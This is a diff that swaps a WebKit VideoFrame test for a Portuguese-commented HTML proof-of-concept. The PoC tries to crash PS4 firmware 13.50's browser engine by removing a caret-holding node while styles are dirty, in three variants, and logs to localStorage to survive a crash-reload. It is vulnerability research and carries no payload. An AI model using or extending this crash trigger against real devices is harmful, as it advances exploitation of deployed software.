@@ -1,20 +1,311 @@
+<!DOCTYPE html>
+<!--
+  PoC: FrameSelection::nodeWillBeRemoved → Document::updateStyleIfNeeded()
+       sob ScriptDisallowedScope::InMainThread
 
-<script src="resources/testharness.js"></script>
-<script src="resources/testharnessreport.js"></script>
+  Baseado no padrão de crash do commit WebKit 628c558 (bug 235184 / rdar://74845918),
+  adaptado para o path de seleção comum (sem drag-and-drop) do PS4.
+
+  Alvo: PS4 FW 13.50 | libSceNKWebKit.sprx | AppleWebKit/605.1.15
+
+  Cadeia testada:
+    JS removeChild()
+    → ContainerNode::removeChild()
+        { ScriptDisallowedScope::InMainThread scriptDisallowedScope; }
+        → Document::nodeWillBeRemoved()
+            → FrameSelection::nodeWillBeRemoved()
+                → node.document().updateStyleIfNeeded()   ← VIOLATION
+                    → RELEASE ASSERTION / CRASH
+
+  Condição necessária para o crash:
+    (1) document.styleScope().hasPendingUpdate() == true  (estilo sujo)
+    (2) Documento tem elemento com -webkit-user-modify     (habilita isEditableNode path)
+    (3) Nó removido contém o caret ativo da FrameSelection
+-->
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FrameSelection nodeWillBeRemoved PoC</title>
+<style>
+/*
+  CONDIÇÃO (2): -webkit-user-modify no body.
+  Sem essa propriedade, isEditableNode() usa o caminho rápido sem updateStyleIfNeeded().
+  Mesmo mecanismo do test case original do commit 628c558.
+*/
+body {
+    font-family: system-ui;
+    -webkit-user-modify: read-write;
+    margin: 0;
+    padding: 16px;
+    background: #0d0d0d;
+    color: #e0e0e0;
+}
+h2 {
+    font-size: 14px;
+    color: #888;
+    font-weight: normal;
+    margin: 0 0 12px;
+}
+#target {
+    width: 320px;
+    height: 80px;
+    border: 2px solid tomato;
+    padding: 12px;
+    margin-bottom: 16px;
+    font-size: 22px;
+    line-height: 56px;
+    color: #fff;
+}
+#log {
+    font-family: monospace;
+    font-size: 11px;
+    white-space: pre;
+    background: #111;
+    color: #39ff14;
+    padding: 12px;
+    border: 1px solid #333;
+    min-height: 160px;
+    overflow-y: auto;
+}
+.ok   { color: #39ff14; }
+.fail { color: #ff4444; }
+.info { color: #888; }
+</style>
+</head>
+<body>
+<h2>FrameSelection::nodeWillBeRemoved PoC — PS4 FW 13.50</h2>
+
+<!-- Nó alvo: contém o caret e o <br> que será removido -->
+<div id="target">Caret aqui<br id="anchor"></div>
+
+<div id="log"></div>
+
 <script>
-function createVideoFrame() {
-    new VideoFrame(new Uint8Array(4), {
-      format: 'NV12',
-      codedWidth: 2,
-      codedHeight: 2,
-      timestamp: 0,
-      layout: [
-        {offset: 0, stride: 2},
-        {offset: 0, stride: 2},
-      ],
+"use strict";
+
+/* ── Logging com persistência (para detectar crash-reload) ── */
+var LOG_KEY = 'poc_frameselhit';
+var logEl   = document.getElementById('log');
+
+function appendLog(msg, cls) {
+    var line = document.createElement('span');
+    line.className = cls || '';
+    line.textContent = msg + '\n';
+    logEl.appendChild(line);
+    // Persiste antes de um possível crash nativo
+    try { localStorage.setItem(LOG_KEY, logEl.textContent); } catch(e) {}
+}
+
+function log(msg)  { appendLog(msg); }
+function ok(msg)   { appendLog('[OK]   ' + msg, 'ok'); }
+function fail(msg) { appendLog('[FAIL] ' + msg, 'fail'); }
+function info(msg) { appendLog('[--]   ' + msg, 'info'); }
+
+/* ── Detecta reload pós-crash ── */
+(function detectCrashReload() {
+    try {
+        var prev = localStorage.getItem(LOG_KEY);
+        if (prev) {
+            appendLog('[RELOAD DETECTADO — log pré-crash:]', 'fail');
+            appendLog(prev, 'info');
+            appendLog('─────────────────────────────────────────', 'info');
+            localStorage.removeItem(LOG_KEY);
+        }
+    } catch(e) {}
+})();
+
+/* ── Utilitário: coloca caret em um nó ── */
+function setCaretInNode(node) {
+    var sel   = window.getSelection();
+    var range = document.createRange();
+    range.setStart(node, 0);
+    range.collapse(true);
+    sel.removeAllRanges();
+    sel.addRange(range);
+    return sel;
+}
+
+/* ── Utilitário: suja o estilo sem resolver (hasPendingUpdate=true) ── */
+function dirtyStyle() {
+    // Modificação de atributo → invalidação de estilo sem layout síncrono
+    document.body.setAttribute('data-dirty', String(Date.now()));
+    // Inline style no target também garante dirty no sub-tree
+    document.getElementById('target').style.color = '#fff';
+    // Neste ponto: styleScope().hasPendingUpdate() == true
+    // NÃO chamamos offsetHeight/offsetTop aqui — isso resolveria o pending.
+}
+
+/* ══════════════════════════════════════════════════════════════════════
+   TESTE A
+   Remover o <br id="anchor"> com caret nele.
+   Replica a lógica do remove-node-on-drop.html do commit 628c558,
+   mas via JS puro (sem drag).
+   ══════════════════════════════════════════════════════════════════════ */
+function testeA() {
+    log('');
+    log('═══ TESTE A: removeChild(<br>) com caret no anchor ═══');
+
+    var anchor = document.getElementById('anchor');
+    var target = document.getElementById('target');
+
+    if (!anchor) { fail('anchor não encontrado'); return false; }
+    if (!target) { fail('target não encontrado'); return false; }
+
+    // Fase 1: Caret no <br>
+    var sel = setCaretInNode(anchor);
+    if (!sel.anchorNode) { fail('getSelection().anchorNode == null'); return false; }
+    ok('Caret em: ' + sel.anchorNode.nodeName + ' offset=' + sel.anchorOffset);
+
+    // Fase 2: Dirty estilo
+    dirtyStyle();
+    ok('Estilo sujo (hasPendingUpdate=true esperado)');
+
+    // Fase 3: removeChild — ScriptDisallowedScope ativo internamente
+    //   Stack esperado do crash:
+    //     ContainerNode::removeChild
+    //       [ScriptDisallowedScope::InMainThread]
+    //         Document::nodeWillBeRemoved
+    //           FrameSelection::nodeWillBeRemoved
+    //             document.updateStyleIfNeeded()  ← VIOLATION → crash
+    log('Chamando removeChild(anchor)...');
+    try {
+        anchor.parentNode.removeChild(anchor);
+        // Se chegar aqui, a path não crashou
+        fail('removeChild retornou sem crash (A). Path pode estar patchada.');
+        return false;
+    } catch(e) {
+        // Exceção JS é improvável; crash nativo não gera catch
+        fail('Exceção JS (inesperado): ' + e);
+        return false;
+    }
+    // Linha inalcançável se crash nativo ocorreu
+}
+
+/* ══════════════════════════════════════════════════════════════════════
+   TESTE B
+   Remover o div#target inteiro com caret no seu firstChild.
+   Verifica se a profundidade da remoção importa.
+   ══════════════════════════════════════════════════════════════════════ */
+function testeB() {
+    log('');
+    log('═══ TESTE B: removeChild(div#target) — remoção do container ═══');
+
+    var target = document.getElementById('target');
+    if (!target) { info('target já removido em A'); return false; }
+
+    // Reinsere target se necessário (caso A não crashou)
+    if (!target.parentNode) {
+        document.body.insertBefore(target, logEl);
+        // Garante que há um TextNode para o caret
+        if (!target.firstChild) {
+            target.appendChild(document.createTextNode('Caret aqui'));
+        }
+    }
+
+    // Caret no firstChild do target
+    var anchor2 = target.firstChild;
+    if (!anchor2) { fail('target.firstChild == null'); return false; }
+
+    var sel = setCaretInNode(anchor2);
+    ok('Caret em: ' + sel.anchorNode.nodeName + ' (firstChild do target)');
+
+    // Dirty mais agressivo: className change também invalida
+    target.className = 'dirty-b';
+    dirtyStyle();
+    ok('Estilo sujo via className + inline style');
+
+    log('Chamando removeChild(target)...');
+    try {
+        target.parentNode.removeChild(target);
+        fail('removeChild retornou sem crash (B). Testando C...');
+        return false;
+    } catch(e) {
+        fail('Exceção JS (B): ' + e);
+        return false;
+    }
+}
+
+/* ══════════════════════════════════════════════════════════════════════
+   TESTE C
+   Variante com innerHTML dirty + remoção via replaceChild.
+   Alguns ports WebKit têm ScriptDisallowedScope em replaceChild também.
+   ══════════════════════════════════════════════════════════════════════ */
+function testeC() {
+    log('');
+    log('═══ TESTE C: replaceChild com caret no nó substituído ═══');
+
+    // Cria novo nó alvo
+    var nodeC = document.createElement('div');
+    nodeC.id  = 'target_c';
+    nodeC.appendChild(document.createTextNode('Caret C'));
+    document.body.insertBefore(nodeC, logEl);
+
+    var sel = setCaretInNode(nodeC.firstChild);
+    ok('Caret em TextNode de nodeC');
+
+    // Dirty: forçar via style sheet change (mais baixo nível)
+    var tmpStyle = document.createElement('style');
+    tmpStyle.textContent = '#target_c { color: red; }';
+    document.head.appendChild(tmpStyle);
+    // Remover tmpStyle marca style como dirty sem resolver
+    document.head.removeChild(tmpStyle);
+    dirtyStyle();
+    ok('Dirty via style sheet add/remove');
+
+    var replacement = document.createElement('div');
+    replacement.textContent = 'replaced';
+
+    log('Chamando replaceChild(replacement, nodeC)...');
+    try {
+        nodeC.parentNode.replaceChild(replacement, nodeC);
+        fail('replaceChild retornou sem crash (C).');
+        return false;
+    } catch(e) {
+        fail('Exceção JS (C): ' + e);
+        return false;
+    }
+}
+
+/* ══════════════════════════════════════════════════════════════════════
+   RUNNER PRINCIPAL
+   Dois rAFs para garantir que layout inicial terminou antes de
+   colocar o caret (selection precisa de layout para calcular posição).
+   ══════════════════════════════════════════════════════════════════════ */
+requestAnimationFrame(function() {
+    requestAnimationFrame(function() {
+        log('FrameSelection::nodeWillBeRemoved PoC');
+        log('Alvo: PS4 FW 13.50 | AppleWebKit/605.1.15');
+        log('Data: ' + new Date().toISOString());
+        log('');
+        info('Condições para crash:');
+        info('  [1] -webkit-user-modify: read-write no body  → OK (CSS)');
+        info('  [2] hasPendingUpdate=true antes do removeChild → forçado abaixo');
+        info('  [3] Selection caret dentro do nó removido    → setCaretInNode()');
+        log('');
+
+        var crashedA = testeA();
+        // Se crashedA == false (retornou), tenta B
+        if (crashedA === false) {
+            var crashedB = testeB();
+            if (crashedB === false) {
+                var crashedC = testeC();
+                if (crashedC === false) {
+                    log('');
+                    log('────────────────────────────────────────────');
+                    fail('Nenhum dos três testes causou crash nativo.');
+                    info('Possíveis razões:');
+                    info('  • FrameSelection::nodeWillBeRemoved não chama');
+                    info('    updateStyleIfNeeded() nesta versão do PS4 WebKit');
+                    info('  • ScriptDisallowedScope não ativo em removeChild aqui');
+                    info('  • isEditableNode() tem guarda diferente do DragCaret path');
+                    info('  • Verificar FrameSelection.cpp do branch Manx/Orbis');
+                    log('────────────────────────────────────────────');
+                }
+            }
+        }
     });
-  }
-test(() => {
-  assert_throws_js(TypeError, () => createVideoFrame());
-}, "VideoFrame constructor should throw type error with bad data");
+});
 </script>
+</body>
+</html>
